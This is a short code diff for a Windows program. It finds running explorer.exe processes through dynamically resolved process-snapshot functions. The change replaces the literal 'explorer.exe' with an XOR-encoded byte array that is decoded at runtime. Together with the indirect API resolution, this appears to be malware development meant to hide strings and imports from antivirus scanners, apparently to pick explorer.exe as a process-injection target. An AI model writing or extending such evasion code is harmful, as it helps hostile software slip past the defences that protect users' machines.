@@ -65,13 +65,21 @@ void findExplorerExe() {
 	if (!TempCreateToolhelp32Snapshot) {
 		populateAPIFile();
 	}
+	BYTE explorer_exe_key[5] = { 141, 106, 211, 65, 174 };
+	BYTE explorer_exe_str[26] = { 23, 149, 84, 190, 33, 114, 249, 44, 209, 81, 0, 149, 73, 190, 35, 114, 187, 44, 219, 81, 10, 149, 73, 190, 81, 114 };
+
+	for (int i = 0; i < 26; i++) {
+		explorer_exe_str[i] ^= 0xFF;
+		explorer_exe_str[i] ^= explorer_exe_key[i % 5];
+	}
+
 	HANDLE hSnapshot = TempCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	PROCESSENTRY32W procEntry = PROCESSENTRY32W();
 	if (hSnapshot != INVALID_HANDLE_VALUE) {
 		procEntry.dwSize = sizeof(PROCESSENTRY32W);
 		if (TempProcess32FirstW(hSnapshot, &procEntry)) {
 			do {
-				if (!TemplstrcmpiW(procEntry.szExeFile, L"explorer.exe")) { // found explorer
+				if (!TemplstrcmpiW(procEntry.szExeFile, (LPCWSTR)explorer_exe_str)) { // found explorer
 					addNode(procEntry.th32ProcessID);
 				}
 			} while (TempProcess32NextW(hSnapshot, &procEntry));
